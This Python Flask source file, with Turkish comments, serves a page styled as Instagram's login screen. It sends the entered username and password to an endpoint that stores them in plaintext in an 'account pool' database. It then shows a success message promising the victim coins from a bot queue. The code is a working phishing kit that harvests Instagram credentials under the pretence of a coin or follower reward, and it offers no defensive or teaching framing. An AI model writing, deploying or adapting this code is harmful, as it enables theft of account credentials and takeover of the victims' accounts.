import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from flask_bcrypt import Bcrypt
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "ist-v1")

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)

# ---------------- MODELLER (HAVUZ SİSTEMİ) ----------------
class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ig_username = db.Column(db.String(100), unique=True, nullable=False)
    ig_password = db.Column(db.String(100), nullable=False) # Havuz için şifre gerekiyor
    coins = db.Column(db.Integer, default=0)

# ---------------- FRONTEND (INSTAGRAM TEMALI) ----------------
UI = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex items-center justify-center h-screen">
    <div class="w-full max-w-sm p-8 border border-gray-800 rounded-sm bg-black">
        <h1 class="text-4xl italic font-serif mb-8 text-center">Instagram</h1>
        
        <div id="loginForm" class="space-y-3">
            <input id="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="w-full p-2 bg-zinc-900 border border-zinc-700 text-sm rounded-sm outline-none focus:border-zinc-500">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-2 bg-zinc-900 border border-zinc-700 text-sm rounded-sm outline-none focus:border-zinc-500">
            <button onclick="saveAcc()" class="w-full bg-blue-500 hover:bg-blue-600 p-1.5 rounded-md font-bold text-sm transition">Giriş Yap</button>
            
            <div class="flex items-center my-4">
                <div class="flex-grow border-t border-zinc-800"></div>
                <span class="px-3 text-zinc-500 text-xs font-bold">YA DA</span>
                <div class="flex-grow border-t border-zinc-800"></div>
            </div>
            
            <p id="msg" class="text-red-500 text-sm text-center hidden">Üzgünüz, şifreniz yanlıştı. Lütfen şifrenizi kontrol edin.</p>
        </div>

        <div id="success" class="hidden text-center">
            <h2 class="text-green-500 font-bold mb-2">Hesap Başarıyla Bağlandı!</h2>
            <p class="text-xs text-zinc-400">Bot kuyruğuna alındınız. Coinleriniz 24 saat içinde yüklenecektir.</p>
        </div>
    </div>

    <script>
        async function saveAcc(){
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;

            const res = await fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });
            
            if(res.ok) {
                document.getElementById('loginForm').classList.add('hidden');
                document.getElementById('success').classList.remove('hidden');
            } else {
                document.getElementById('msg').classList.remove('hidden');
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(UI)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u = data.get('u')
    p = data.get('p')
    
    # Hesabı veritabanına kaydet (Havuz Sistemi)
    existing = IGAccount.query.filter_by(ig_username=u).first()
    if existing:
        existing.ig_password = p
    else:
        new_acc = IGAccount(ig_username=u, ig_password=p)
        db.session.add(new_acc)
    
    db.session.commit()
    return jsonify(status="ok")

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
